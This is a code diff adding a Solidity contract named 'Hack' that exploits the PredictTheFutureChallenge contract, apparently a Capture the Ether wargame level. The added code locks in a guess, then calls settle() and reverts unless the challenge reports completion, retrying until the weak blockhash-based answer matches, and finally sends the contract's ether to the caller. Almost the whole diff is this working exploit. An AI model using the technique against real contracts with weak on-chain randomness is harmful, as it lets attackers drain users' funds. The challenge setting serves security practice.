@@ -44,3 +44,28 @@ contract PredictTheFutureChallenge {
         }
     }
 }
+
+contract Hack {
+    PredictTheFutureChallenge predictContract;
+
+    constructor(address _predictContract) {
+        predictContract = PredictTheFutureChallenge(_predictContract);
+    }
+
+    receive() external payable {}
+
+    function guess(uint8 answer) public payable {
+        require(answer >= 0 && answer <= 9);
+        predictContract.lockInGuess{value: 1 ether}(answer);
+    }
+
+    function attack() public {
+        predictContract.settle();
+        require(predictContract.isComplete(), "Try again");
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function showBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
